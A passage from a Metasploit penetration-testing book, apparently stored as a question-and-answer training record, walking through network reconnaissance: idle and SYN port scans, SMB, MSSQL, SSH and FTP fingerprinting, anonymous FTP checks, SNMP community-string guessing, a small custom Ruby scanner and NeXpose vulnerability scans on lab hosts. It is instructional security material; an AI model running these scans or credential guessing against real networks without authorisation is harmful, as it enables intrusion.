address\nINTERFACE no The name of the interface\nLHOST no The local IP address\n(cid:88) RHOSTS yes The target address range or CIDR identifier\nRPORT 80 yes The target port\nSNAPLEN 65535 yes The number of bytes to capture\n(cid:89) THREADS 1 yes The number of concurrent threads\nTIMEOUT 500 yes The reply read timeout in milliseconds\nThis listing displays the required options for the ipidseq scan. One notable\none, RHOSTS at (cid:88), can take IP ranges (such as 192.168.1.20–192.168.1.30);\nClassless Inter-Domain Routing (CIDR) ranges (such as 192.168.1.0/24);\nmultiple ranges separated by commas (such as 192.168.1.0/24, 192.168.3.0/24);\nand a text file with one host per line (such as file:/tmp/hostlist.txt). All these\noptions give us quite a bit of flexibility in specifying our targets.\nThe THREADS value at (cid:89) sets the number of concurrent threads to use\nwhile scanning. By default, all scanner modules have their THREADS value initially\nset to 1. We can raise this value to speed up our scans or lower it to reduce\nnetwork traffic. In general, you should not set the THREADS value greater 16\nwhen running Metasploit on Windows, and not greater than 128 on UNIX-\nlike operating systems.\n22 Chapter 3\nNow let’s set our values and run the module. We’ll set the value for RHO-\nSTS to 192.168.1.0/24, set THREADS to 50, and then run the scan.\nmsf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf auxiliary(ipidseq) > set THREADS 50\nTHREADS => 50\nmsf auxiliary(ipidseq) > run\n[*] 192.168.1.1's IPID sequence class: All zeros\n[*] 192.168.1.10's IPID sequence class: Incremental!\n[*] Scanned 030 of 256 hosts (011% complete)\n[*] 192.168.1.116's IPID sequence class: All zeros\n(cid:88) [*] 192.168.1.109's IPID sequence class: Incremental!\n[*] Scanned 128 of 256 hosts (050% complete)\n[*] 192.168.1.154's IPID sequence class: Incremental!\n[*] 192.168.1.155's IPID sequence class: Incremental!\n[*] Scanned 155 of 256 hosts (060% complete)\n[*] 192.168.1.180's IPID sequence class: All zeros\n[*] 192.168.1.181's IPID sequence class: Incremental!\n[*] 192.168.1.185's IPID sequence class: All zeros\n[*] 192.168.1.184's IPID sequence class: Randomized\n[*] Scanned 232 of 256 hosts (090% complete)\n[*] Scanned 256 of 256 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(ipidseq) >\nJudging by the results of our scan, we see a number of potential idle hosts\nthat we can use to perform idle scanning. We’ll try scanning a host using the\nsystem at 192.168.1.109 shown at (cid:88) by using the -sI command line flag to\nspecify the idle host:\nmsf auxiliary(ipidseq) > nmap -PN -sI 192.168.1.109 192.168.1.155\n[*] exec: nmap -PN -sI 192.168.1.109 192.168.1.155\nIdle scan using zombie 192.168.1.109 (192.168.1.109:80); Class: Incremental\nInteresting ports on 192.168.1.155:\nNot shown: 996 closed|filtered ports\nPORT STATE SERVICE\n135/tcp open msrpc\n139/tcp open netbios-ssn\n445/tcp open microsoft-ds\nMAC Address: 00:0C:29:E4:59:7C (VMware)\nNmap done: 1 IP address (1 host up) scanned in 7.12 seconds\nmsf auxiliary(ipidseq) >\nBy using the idle host, we were able to discover a number of open ports\non our target system without sending a single packet to the system.\nIntelligence Gathering 23\nRunning Nmap from MSFconsole\nNow that we’ve performed advanced enumeration on our target, let’s connect\nnmap with Metasploit. To do this, we first connect to the msfbook database:\nmsf > db_connect postgres:toor@127.0.0.1/msf3\nNow we should be able to enter the db_nmap command from within\nmsfconsole to run nmap and have its results automatically stored in our new\ndatabase.\nNOTE We’ll be attacking only one system in this instance, but you can specify IPs by CIDR\nnotation and even ranges (for example, 192.168.1.1/24 or 192.168.1.1–254).\nmsf > db_nmap -sS -A 172.16.32.131\nWarning: Traceroute does not support idle or connect scan, disabling...\nNmap scan report for 172.16.32.131\nHost is up (0.00056s latency).\nNot shown: 990 closed ports\nPORT STATE SERVICE VERSION\n21/tcp (cid:88)open ftp Microsoft ftpd\n25/tcp open smtp Microsoft ESMTP 6.0.2600.2180 (cid:89)\n80/tcp open http Microsoft IIS webserver 5.1\n|_html-title:\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn\n443/tcp open https?\n445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds\n1025/tcp open msrpc Microsoft Windows RPC\n1433/tcp open ms-sql-s Microsoft SQL Server 2005 9.00.1399; RTM\n3389/tcp open microsoft-rdp Microsoft Terminal Service\nMAC Address: 00:0C:29:EA:26:7C (VMware)\nDevice type: general purpose\nRunning: Microsoft Windows XP|2003 (cid:90)\nOS details: Microsoft Windows XP Professional SP2 or Windows Server 2003\nNetwork Distance: 1 hop\nService Info: Host: ihazsecurity; OS: Windows\nHost script results:\n|_nbstat: NetBIOS name: IHAZSECURITY, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:ea:26:7c\n| smb-os-discovery:\n| OS: Windows XP (Windows 2000 LAN Manager)\n| Name: WORKGROUP\\IHAZSECURITY\n|_smbv2-enabled: Server doesn't support SMBv2 protocol\nOS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/.\nNmap done: 1 IP address (1 host up) scanned in 33.51 seconds\nNotice a series of open ports (cid:88), software versions (cid:89), and even a predic-\ntion about the target’s operating system (cid:90).\n24 Chapter 3\nTo check that the results from the scan are stored in the database, we\nrun db_services:\nmsf > db_services\nServices\n========\nhost port proto name state info\n---- ---- ----- ---- ----- ----\n172.16.32.131 135 tcp msrpc open Microsoft Windows RPC\n172.16.32.131 139 tcp netbios-ssn open\n172.16.32.131 445 tcp microsoft-ds open Microsoft Windows XP microsoft-ds\n172.16.32.131 777 tcp unknown open\n172.16.32.131 1433 tcp ms-sql-s open Microsoft SQL Server 2005 9.00.1399; RTM\nWe’re beginning to develop a picture of our target and exposed ports for\nuse as potential attack vectors.\nPort Scanning with Metasploit\nIn addition to its ability to use third-party scanners, Metasploit has several\nport scanners built into its auxiliary modules that directly integrate with most\naspects of the Framework. In later chapters, we’ll use these port scanners to\nleverage compromised systems to access and attack; his process, often called\npivoting, allows us to use internally connected systems to route traffic to a net-\nwork that would otherwise be inaccessible.\nFor example, suppose you compromise a system behind a firewall that is\nusing Network Address Translation (NAT). The system behind the NAT-based\nfirewall uses private IP addresses, which you cannot contact directly from the\nInternet. If you use Metasploit to compromise a system behind a NAT, you\nmight be able to use that compromised internal system to pass traffic (pivot)\nto internally hosted and private IP-based systems to penetrate the network\nfarther behind the firewall.\nTo see the list of port scanning tools that the Framework offers, enter the\nfollowing:\nmsf > search portscan\nLet’s conduct a simple scan of a single host using Metasploit’s SYN Port\nScanner. In the following listing, we start the scan with use scanner/portscan/\nsyn, set RHOSTS to 192.168.1.155, set THREADS to 50, and then run the scan.\nmsf > use scanner/portscan/syn\nmsf auxiliary(syn) > set RHOSTS 192.168.1.155\nRHOSTS => 192.168.1.155\nmsf auxiliary(syn) > set THREADS 50\nTHREADS => 50\nIntelligence Gathering 25\nmsf auxiliary(syn) > run\n(cid:88) [*] TCP OPEN 192.168.1.155:135\n[*] TCP OPEN 192.168.1.155:139\n[*] TCP OPEN 192.168.1.155:445\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(syn) >\nFrom the results, you can see at (cid:88) that ports 135, 139, and 445 are open on\nIP address 192.168.1.155, leveraging the portscan syn module within Metasploit.\nTargeted Scanning\nWhen you are conducting a penetration test, there is no shame in looking\nfor an easy win. A targeted scan looks for specific operating systems, services,\nprogram versions, or configurations that are known to be exploitable and\nthat provide an easy door into a target network. For example, it is common\nto scan a target network quickly for the vulnerability MS08-067, as this is\n(still) an extremely common hole that will give you SYSTEM access much\nmore quickly than scanning an entire target network for vulnerabilities.\nServer Message Block Scanning\nMetasploit can scour a network and attempt to identify versions of Microsoft\nWindows using its smb_version module.\nNOTE If you are not familiar with Server Message Block (SMB, a common file-sharing protocol),\nstudy up a bit on the different protocols and their purposes before you continue. You will\nneed to understand basic port information to learn how to attack a system successfully.\nWe run the module, list our options, set RHOSTS, and begin scanning:\nmsf > use scanner/smb/smb_version\nmsf auxiliary(smb_version) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOSTS yes The target address range or CIDR identifier\nTHREADS 1 yes The number of concurrent threads\nmsf auxiliary(smb_version) > set RHOSTS 192.168.1.155\nRHOSTS => 192.168.1.155\nmsf auxiliary(smb_version) > run\n(cid:88) [*] 192.168.1.155 is running Windows XP Service Pack 2 (language: English)\n(name:DOOKIE-FA154354) (domain:WORKGROUP)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n26 Chapter 3\nAs you can see at (cid:88) the smb_version scanner has pinpointed the operating\nsystem as Windows XP with Service Pack 2. Because we are scanning only one\nsystem, we leave THREADS set to 1. If we had been scanning a number of systems,\nsuch as a class C subnet range, we might consider upping the THREADS using the\nset THREADS number option. The results of this scan are stored in the Metasploit\ndatabase for use at a later time and to be accessed with the db_hosts command.\nmsf auxiliary(smb_version) > db_hosts -c address,os_flavor\nHosts\n=====\naddress os_flavor Svcs Vulns Workspace\n------- --------- ---- ----- ---------\n192.168.1.155 Windows XP 3 0 default\nmsf auxiliary(smb_version) >\nWe have discovered a system running Windows XP without having to do\na full scan of the network. This is a great way to target hosts quickly and quietly\nthat are likely to be more vulnerable when our goal is avoid being noticed.\nHunting for Poorly Configured Microsoft SQL Servers\nPoorly configured Microsoft SQL Server (MS SQL) installations often provide\nan initial way into a target network. In fact, many system administrators don’t\neven realize that they have MS SQL servers installed on their workstations at\nall, because the service is installed as a prerequisite for some common soft-\nware, such as Microsoft Visual Studio. These installations are often unused,\nunpatched, or never even configured.\nWhen MS SQL is installed, it listens by default either on TCP port 1433\nor on a random dynamic TCP port. If MS SQL is listening on a dynamic port,\nsimply query UDP port 1434 to discover on what dynamic TCP port MS SQL\nis listening. Of course, Metasploit has a module that can make use of this\n“feature”: mssql_ping.\nBecause mssql_ping uses UDP, it can be quite slow to run across entire\nsubnets because of issues with timeouts. But on a local LAN, setting THREADS\nto 255 will greatly speed up the scan. As Metasploit finds MS SQL servers, it\ndisplays all the details it can extract from them including, perhaps most impor-\ntantly, the TCP port on which the server is listening.\nHere’s how you might run an mssql_ping scan, which includes starting the\nscan, listing and setting options, and the results.\nmsf > use scanner/mssql/mssql_ping\nmsf auxiliary(mssql_ping) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nPASSWORD no The password for the specified username\nRHOSTS yes The target address range or CIDR identifier\nIntelligence Gathering 27\nTHREADS 1 yes The number of concurrent threads\nUSERNAME sa no The username to authenticate as\nWORKSPACE no The name of the workspace to report data into\nmsf auxiliary(mssql_ping) > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf auxiliary(mssql_ping) > set THREADS 255\nTHREADS => 255\nmsf auxiliary(mssql_ping) > run\n(cid:88) [*] SQL Server information for 192.168.1.155:\n[*] ServerName = V-XPSP2-BARE\n(cid:89) [*] InstanceName = SQLEXPRESS\n[*] IsClustered = No\n(cid:90) [*] Version = 10.0.1600.22\n(cid:91) [*] tcp = 1433\nAs you can see, not only does the scanner locate a MS SQL server at (cid:88),\nbut it also identifies the instance name at (cid:89), the SQL server version at (cid:90), and\nthe TCP port number at (cid:91) on which it is listening. Just think of how much\ntime this targeted scan for SQL servers would save over running nmap against\nall ports on all machines in a target subnet in search of the elusive TCP port.\nSSH Server Scanning\nIf during your scanning you encounter machines running Secure Shell (SSH),\nyou should determine which version is running on the target. SSH is a secure\nprotocol, but vulnerabilities in various implementations have been identified.\nYou never know when you might get lucky and come across an old machine\nthat hasn’t been updated. You can use the Framework’s ssh_version module to\ndetermine the SSH version running on the target server.\nmsf > use scanner/ssh/ssh_version\nmsf auxiliary(ssh_version) > set THREADS 50\nTHREADS => 50\nmsf auxiliary(ssh_version) > run\n[*] 192.168.1.1:22, SSH server version: SSH-2.0-dropbear_0.52\n[*] Scanned 044 of 256 hosts (017% complete)\n[*] 192.168.1.101:22, SSH server version: SSH-2.0-OpenSSH_5.1p1 Debian-3ubuntu1\n[*] Scanned 100 of 256 hosts (039% complete)\n[*] 192.168.1.153:22, SSH server version: SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1\n[*] 192.168.1.185:22, SSH server version: SSH-2.0-OpenSSH_4.3\nThis output tells us that a few different servers are running with various\npatch levels. This information could prove useful if, for example, we wanted\nto attack a specific version of OpenSSH as found with the ssh_version scan.\n28 Chapter 3\nFTP Scanning\nFTP is a complicated and insecure protocol. FTP servers are often the easiest\nway into a target network, and you should always scan for, identify, and finger-\nprint any FTP servers running on your target.\nNext, we scan our XP box for FTP services using the Framework’s\nftp_version module:\nmsf > use scanner/ftp/ftp_version\nmsf auxiliary(ftp_version) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nFTPPASS mozilla@example.com no The password for the specified username\nFTPUSER anonymous no The username to authenticate as\nRHOSTS yes The target address range or CIDR identifier\nRPORT 21 yes The target port\nTHREADS 1 yes The number of concurrent threads\nWORKSPACE no The name of the workspace to report data into\nmsf auxiliary(ftp_version) > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf auxiliary(ftp_version) > set THREADS 255\nTHREADS => 255\nmsf auxiliary(ftp_version) > run\n(cid:88) [*] 192.168.1.155:21 FTP Banner: Minftpd ready\nThe scanner successfully identifies an FTP server at (cid:88). Now let’s see if\nthis FTP server allows anonymous logins using the Framework’s scanner/ftp/\nanonymous.\nmsf > use auxiliary/scanner/ftp/anonymous\nmsf auxiliary(anonymous) > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf auxiliary(anonymous) > set THREADS 50\nTHREADS => 50\nmsf auxiliary(anonymous) > run\n[*] Scanned 045 of 256 hosts (017% complete)\n(cid:88) [*] 192.168.1.155:21 Anonymous READ/WRITE (220 Minftpd ready)\nThe scanner reports at (cid:88) that anonymous access is allowed and that\nanonymous users have both read and write access to the server; in other\nwords, we have full access to the remote system and the ability to upload or\ndownload any file that can be accessed by the FTP server software.\nIntelligence Gathering 29\nSimple Network Management Protocol Sweeping\nThe Simple Network Management Protocol (SNMP) is typically used in net-\nwork devices to report information such as bandwidth utilization, collision\nrates, and other information. However, some operating systems also have\nSNMP servers that can provide information such as CPU utilization, free\nmemory, and other system-specific details.\nConvenience for the system administrator can be a gold mine for the\npenetration tester, and accessible SNMP servers can offer considerable infor-\nmation about a specific system or even make it possible to compromise a\nremote device. If, for instance, you can get the read/write SNMP community\nstring for a Cisco router, you can download the router’s entire configuration,\nmodify it, and upload it back to the router.\nThe Metasploit Framework includes a built-in auxiliary module called\nscanner/snmp/snmp_enum that is designed specifically for SNMP sweeps. Before\nyou start the scan, keep in mind that the read-only (RO) and read/write (RW)\ncommunity strings will play an important role in the type of information you\nwill be able to extract from a given device. On Windows-based devices con-\nfigured with SNMP, you can often use the RO or RW community strings to\nextract patch levels, running services, usernames, uptime, routes, and other\ninformation that can make things much easier for you during a pen test.\n(Community strings are essentially passwords used to query a device for infor-\nmation or to write configuration information to the device.)\nAfter you guess the community strings, SNMP itself (depending on the\nversion) can allow anything from excessive information disclosure to full sys-\ntem compromise. SNMPv1 and v2 are inherently flawed protocols. SNMPv3,\nwhich incorporates encryption and better check mechanisms, is significantly\nmore secure. To gain access to a switch, you’ll first need to attempt to find its\ncommunity strings. The Framework’s use scanner/snmp/snmp_login module\nwill try a word list against one or a range of IP addresses.\nmsf > use use scanner/snmp/snmp_login\nmsf auxiliary(snmp_login) > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf auxiliary(snmp_login) > set THREADS 50\nTHREADS => 50\nmsf auxiliary(snmp_login) > run\n[*] >> progress (192.168.1.0-192.168.1.255) 0/30208...\n(cid:88) [*] 192.168.1.2 'public' 'GSM7224 L2 Managed Gigabit Switch'\n(cid:89) [*] 192.168.1.2 'private' 'GSM7224 L2 Managed Gigabit Switch'\n[*] Auxiliary module execution completed\nmsf auxiliary(snmp_login) >\nA quick Google search for GSM7224 from the output tells us that the\nscanner has found both the public (cid:88) and private (cid:89) community strings for a\nNetgear switch. This result, believe it or not, has not been staged for this book.\nThese are the default factory settings for this switch.\n30 Chapter 3\nYou will encounter many jaw-dropping situations like these throughout\nyour pen testing career, because many administrators simply attach devices to a\nnetwork with all their defaults still in place. The situation is even scarier when\nyou find these devices accessible from the Internet within a large corporation.\nWriting a Custom Scanner\nMany applications and services lack custom modules in Metasploit. Thank-\nfully, the Framework has many features that can be useful when you’re build-\ning a custom scanner, including offering access to all of its exploit classes\nand methods, and support for proxies, Secure Sockets Layer (SSL), report-\ning, and threading. It can be very useful to write your own scanner during\nsecurity assessments, because doing so will allow you to locate every instance\nof a bad password or unpatched service quickly on a target system.\nThe Metasploit Framework scanner modules include various mixins, such as\nexploit mixins for TCP, SMB, and so on, and the auxiliary scanner mixin that\nis built into the Framework. Mixins are portions of code with predefined\nfunctions and calls that are preconfigured for you. The Auxiliary::Scanner\nmixin overloads the Auxiliary run method; calls the module method at runt-\nime with run_host(ip), run_range(range), or run_batch(batch); and then pro-\ncesses the IP addresses. We can leverage Auxiliary::Scanner to call additional,\nbuilt-in Metasploit functionality.\nFollowing is a Ruby script for a simple TCP scanner that will connect to a\nremote host on a default port of 12345 and upon connecting, send “HELLO\nSERVER,” receive the server response, and print it out along with the server’s\nIP address.\n#Metasploit\nrequire 'msf/core'\nclass Metasploit3 < Msf::Auxiliary\n(cid:88)include Msf::Exploit::Remote::Tcp\n(cid:89)include Msf::Auxiliary::Scanner\ndef initialize\nsuper(\n'Name' => 'My custom TCP scan',\n'Version' => '$Revision: 1 $',\n'Description' => 'My quick scanner',\n'Author' => 'Your name here',\n'License' => MSF_LICENSE\n)\nregister_options(\n[\n(cid:90)Opt::RPORT(12345)\n], self.class)\nend\nIntelligence Gathering 31\ndef run_host(ip)\nconnect()\n(cid:91)sock.puts('HELLO SERVER')\ndata = sock.recv(1024)\n(cid:92)print_status(\"Received: #{data} from #{ip}\")\ndisconnect()\nend\nend\nThis simple scanner uses the Msf::Exploit::Remote::Tcp (cid:88) mixin to handle\nthe TCP networking, and the Msf::Auxiliary::Scanner mixin exposes the vari-\nous settings that are required for scanners within the Framework (cid:89). This\nscanner is configured to use the default port of 12345 (cid:90), and upon connect-\ning to the server, it sends a message (cid:91), receives the reply from the server, and\nthen prints it out to the screen along with the server IP address (cid:92).\nWe have saved this custom script under modules/auxiliary/scanner/ as\nsimple_tcp.rb. The saved location is important in Metasploit. For example, if\nthe module is saved under modules/auxiliary/scanner/http/, it would show up\nin the modules list as scanner/http/simple_tcp.\nTo test this rudimentary scanner, we set up a netcat listener on port 12345\nand pipe in a text file to act as the server response.\nroot@bt:/# echo \"Hello Metasploit\" > banner.txt\nroot@bt:/# nc -lvnp 12345 < banner.txt\nlistening on [any] 12345...\nNext, we load up msfconsole, select our scanner module, set its param-\neters, and run it to see if it works.\nmsf > use auxiliary/scanner/simple_tcp\nmsf auxiliary(simple_tcp) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOSTS yes The target address range or CIDR identifier\nRPORT 12345 yes The target port\nTHREADS 1 yes The number of concurrent threads\nmsf auxiliary(simple_tcp) > set RHOSTS 192.168.1.101\nRHOSTS => 192.168.1.101\nmsf auxiliary(simple_tcp) > run\n[*] Received: Hello Metasploit from 192.168.1.101\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(simple_tcp) >\n32 Chapter 3"
  },
  {
    "input": "What is the role of the Metasploit Framework in integrating and utilizing vulnerability scanning tools like NeXpose and Nessus during a penetration test?",
    "summary": "The Metasploit Framework allows for efficient and customizable vulnerability scanning, helping penetration testers gather intelligence and identify weaknesses in systems. It can integrate with tools like NeXpose and Nessus to automate the process and provide detailed reports. Additionally, Metasploit offers auxiliary modules for specific scans, such as checking for unpatched systems or open VNC/X11 servers, which can be valuable for exploitation.",
    "output": "Although this is only a simple example, the level of versatility afforded by\nthe Metasploit Framework can be of great assistance when you need to get\nsome custom code up and running quickly in the middle of a pen test. Hope-\nfully, this simple example demonstrates the power of the Framework and\nmodular code. But, of course, you don’t have to do everything by hand.\nLooking Ahead\nIn this chapter, you learned how to leverage the Metasploit Framework\nforintelligence gathering, as outlined in the PTES. Intelligence gathering\ntakes practice and requires a deep understanding of how an organization\noperates and how to identify the best potential attack vectors. As with any-\nthing, you should adapt and improve your own methodologies throughout\nyour penetration-testing career. Just remember that your main focus for this\nphase is to learn about the organization you’re attacking and its overall foot-\nprint. Regardless of whether your work occurs over the Internet, on an inter-\nnal network, wirelessly, or via social engineering, the goals of intelligence\ngathering will always be the same.\nIn the next chapter, we’ll move on to another important step during the\nvulnerability analysis phase: automated vulnerability scanning. In later chap-\nters, we will explore more in-depth examples of how to create your own mod-\nules, exploits, and Meterpreter scripts.\nIntelligence Gathering 33\nV U L N E R A B I L I T Y S C A N N I N G\nA vulnerability scanner is an automated program\ndesigned to look for weaknesses in computers, com-\nputer systems, networks, and applications. The pro-\ngram probes a system by sending data to it over a\nnetwork and analyzing the responses received, in an\neffort to enumerate any vulnerabilities present on the\ntarget by using its vulnerability database as reference.\nVarious operating systems tend to respond differently when sent particular\nnetwork probes because of the different networking implementations in use.\nThese unique responses serve as a fingerprint that the vulnerability scanner\nuses to determine the operating system version and even its patch level. A\nvulnerability scanner can also use a given set of user credentials to log into\nthe remote system and enumerate the software and services to determine\nwhether they are patched. With the results it obtains, the scanner presents a\nreport outlining any vulnerabilities detected on the system. That report can\nbe useful for both network administrators and penetration testers.\nVulnerability scanners generally create a lot of traffic on a network and\nare therefore not typically used in a penetration test when one of the objec-\ntives is to remain undetected. If, however, you are running a penetration test\nand stealth is not an issue, a vulnerability scanner can save you from having\nto probe systems manually to determine their patch levels and vulnerabilities.\nWhether you use an automated scanner or do it manually, scanning is\none of the most important steps in the penetration testing process; if done\nthoroughly, it will provide the best value to your client. In this chapter, we\nwill discuss a number of vulnerability scanners and how they can be integrated\nwithin Metasploit. We’ll highlight some auxiliary modules in the Metasploit\nFramework that can locate specific vulnerabilities in remote systems.\nThe Basic Vulnerability Scan\nLet’s look at how a scan works at the most basic level. In the following listing,\nwe use netcat to grab a banner from the target 192.168.1.203. Banner grabbing\nis the act of connecting to a remote network service and reading the service\nidentification (banner) that is returned. Many network services such as web,\nfile transfer, and mail servers return their banner either immediately upon\nconnecting to them or in response to a specific command. Here we connect\nto a web server on TCP port 80 and issue a GET HTTP request that allows us to\nlook at the header information that the remote server returns in response to\nour request.\nroot@bt:/opt/framework3/msf3# nc 192.168.1.203 80\nGET HTTP 1/1\nHTTP/1.1 400 Bad Request\n(cid:88) Server: Microsoft-IIS/5.1\nThe information returned at (cid:88) tells us that the system running on port 80\nis a Microsoft IIS 5.1–based web server. Armed with this information, we could\nuse a vulnerability scanner, as shown in Figure 4-1, to determine whether this\nversion of IIS has any vulnerabilities associated with it and whether this par-\nticular server has been patched.\nOf course, in practice, it’s not that simple. Vulnerability scans often con-\ntain many false positives (reported vulnerability where none exists) and false\nnegatives (failure to log a vulnerability where one exists) due to subtle differ-\nences in system and application configurations. In addition, the creators of vul-\nnerability scanners have an incentive to report positives: The more “hits” a\nvulnerability scanner finds, the better it looks to a potential buyer. Vulnera-\nbility scanners are only as good as their vulnerabilities database, and they can\neasily be fooled by misleading banners or inconsistent configurations.\nLet’s take a look at some of the more useful vulnerability scanners,\nincluding NeXpose, Nessus, and some specialized scanners.\n36 Chapter 4\nFigure 4-1: Vulnerability scan results against the target web server\nScanning with NeXpose\nNeXpose is Rapid7’s vulnerability scanner that scans networks to identify\nthe devices running on them and performs checks to identify security weak-\nnesses in operating systems and applications. It then analyzes the scan data\nand processes it for inclusion in various reports.\nRapid7 offers multiple versions of NeXpose, but we’ll use the Community\nedition because it’s free. If you plan to use NeXpose commercially, see the\nRapid7 site (http://www.rapid7.com/vulnerability-scanner.jsp) for information\non the various versions and their capabilities and pricing.\nOur target for scanning will be a default installation of Windows XP SP2\nas configured in Appendix A. We will first perform a basic overt scan of our\ntarget and import the vulnerability scan results into Metasploit. We will close\nout this section by showing you how to run a NeXpose vulnerability scan\ndirectly from msfconsole rather than using the web-based GUI, eliminating the\nneed to import a scan report.\nConfiguration\nAfter installing NeXpose Community, open a web browser and navigate to\nhttps://<youripaddress>:3780. Accept the NeXpose self-signed certificate, and\nlog in using the credentials you created during setup. You should next be\npresented with an interface similar to the one shown in Figure 4-2. (You’ll\nfind complete installation instructions for NeXpose at the Rapid7 website.)\nOn the NeXpose main page, you will notice a number of tabs at the top\nof the interface:\n(cid:122) The Assets tab (cid:88) displays details of computers and other devices on your\nnetwork after they have been scanned.\n(cid:122) The Reports tab (cid:89) lists vulnerability scan reports after they have been\ngenerated.\n(cid:122) The Vulnerabilities tab (cid:90) gives you details on any vulnerabilities discov-\nered during your scans.\n(cid:122) The Administration tab (cid:91) allows you to configure various options.\nVulnerability Scanning 37\n(cid:2) (cid:3) (cid:4) (cid:5)\nFigure 4-2: The NeXpose’s initial home screen\nButtons in the main body of the page let you perform common tasks\nsuch as creating a new site or setting up a new vulnerability scan.\nThe New Site Wizard\nPrior to running a vulnerability scan with NeXpose, you need to configure a\nsite—a logical collection of devices such as a specific subnet, a collection of\nservers, or even a single workstation. These sites will then be scanned by\nNeXpose, and different scan types can be defined for a particular site.\n1. To create a site, click the New Site button on the NeXpose home page,\nenter a name for your site and a brief description, and then click Next.\n2. In the devices step, shown in Figure 4-3, you have quite a bit of granular-\nity in defining your targets. You can add a single IP address, address ranges,\nhostnames, and more. You can also declare devices, such as printers, to\nexclude from scans. (Printers frequently don’t take kindly to being scanned.\nWe have seen instances in which a simple vulnerability scan caused more\nthan one million pages of pure black to be placed in the queue to print!)\nClick Next when you have finished adding and excluding devices.\n3. At the scan setup step, you can choose from several different scan tem-\nplates, such as Discovery Scan and Penetration test; select the scanning\nengine you want to use; or set up an automated scanning schedule. For\npurposes of this initial walk-through, keep the default selections and\nclick Next to continue.\n4. Add credentials for the site you want to scan, if you have them. Credentials\ncan help create more accurate and complete results by performing in-\ndepth enumeration of installed software and system policies on the target.\n5. On the Credentials tab, click the New Login button, type a username\nand password for the IP address you want to scan, and then click Test\nLogin to verify your credentials then save them.\n38 Chapter 4\nFigure 4-3: Adding a device to the new NeXpose site\n6. Last, click Save to complete the New Site wizard and return to the Home\ntab, which should list your newly added site, as shown in Figure 4-4.\nFigure 4-4: The Home tab shows the newly configured site.\nThe New Manual Scan Wizard\nWith your new site configured, you are now set to configure your first scan:\n1. Click the New Manual Scan button shown in Figure 4-4. You should see\nthe Start New Scan dialog shown in Figure 4-5, which prompts you for the\nassets you want to scan or exclude. In this example, we are scanning our\ndefault Windows XP system.\n2. Double-check your target IP address to be sure that you’re not about to\nscan the wrong device or network inadvertently, and click the Start Now\nbutton to begin.\nVulnerability Scanning 39\nFigure 4-5: The NeXpose scan configuration dialog\n3. NeXpose should dynamically refresh the page as the scan progresses.\nWaituntil the status for both Scan Progress and Discovered Assets shows\nCompleted, as shown in Figure 4-6. Under the Scan Progress section, you\ncan see that our single scanned device has 268 vulnerabilities detected,\nand under Discovered Assets, you are provided with more information\nabout the target such as the device name and its operating system. Now\nclick the Reports tab.\nFigure 4-6: The completed NeXpose scan and report\n40 Chapter 4\nThe New Report Wizard\nIf this is your first time running NeXpose and you have completed only one\nscan, the Reports tab should show that you have generated no reports.\n1. Click New Report, as shown in Figure 4-7, to start the New Report wizard.\nFigure 4-7: The NeXpose Reports tab\n2. Enter a friendly name, and then in the Report format field, select NeXpose\nSimple XML Export, as shown in Figure 4-8, so that you will be able to\nimport the scan results into Metasploit. You can select from different report\ntemplates and configure the time zone if you happen to be conducting\nyour pen test on the road. Click Next when you are ready to proceed.\nFigure 4-8: Selecting a name and format for the report\n3. In the subsequent window, add the devices you want to be included in\nthe report by clicking Select Sites to add your scanned target range, as\nshown in Figure 4-9. Then click Save.\nFigure 4-9: Selecting the site for inclusion in the report\nVulnerability Scanning 41\n4. In the Select Devices dialog, select the targets to include in your report\nand then click Save.\n5. Back in the Report Configuration wizard, click Save to accept the remaining\ndefaults for the report. The Reports tab should now list the newly created\nreport, as shown in Figure 4-10. (Be sure to save the report file so that\nyou can use it with the Framework.)\nFigure 4-10: The Reports tab lists your reports.\nImporting Your Report into the Metasploit Framework\nHaving completed a full vulnerability scan with NeXpose, you need to import\nthe results into Metasploit. But before you do, you must create a new database\nfrom msfconsole by issuing db_connect. After creating that database you’ll import\nthe NeXpose XML using the db_import command. Metasploit will automati-\ncally detect that the file is from NeXpose and import the scanned host. You\ncan then verify that the import was successful by running the db_hosts command.\n(These steps are shown in the following listing.) As you can see at (cid:88), Metasploit\nknows about the 268 vulnerabilities that your scan picked up.\nmsf > db_connect postgres:toor@127.0.0.1/msf3\nmsf > db_import /tmp/host_195.xml\n[*] Importing 'NeXpose Simple XML' data\n[*] Importing host 192.168.1.195\n[*] Successfully imported /tmp/host_195.xml\nmsf > db_hosts -c address,svcs,vulns\nHosts\n=====\naddress Svcs Vulns Workspace\n------- ---- ----- ---------\n192.168.1.195 8 268(cid:88) default\nTo display the full details of the vulnerabilities imported into Metasploit,\nincluding Common Vulnerabilities and Exposures (CVE) numbers and other\nreferences, run the following:\nmsf > db_vulns\nAs you can see, running an overt vulnerability scan with full credentials\ncan provide an amazing amount of information—268 vulnerabilities found\n42 Chapter 4\nin this case. But, of course, this has been a very noisy scan, likely to attract lots\nof attention. These types of vulnerability scans are best used in a pen test\nwhere being stealthy is not required.\nRunning NeXpose Within MSFconsole\nRunning NeXpose from the web GUI is great for fine-tuning vulnerability\nscans and generating reports, but if you prefer to remain in msfconsole, you\ncan still run full vulnerability scans with the NeXpose plug-in included in\nMetasploit.\nTo demonstrate the difference in results between a credentialed and non-\ncredentialed scan, we will run a scan from with Metasploit without specifying\na username and password for the target system. Before you begin, 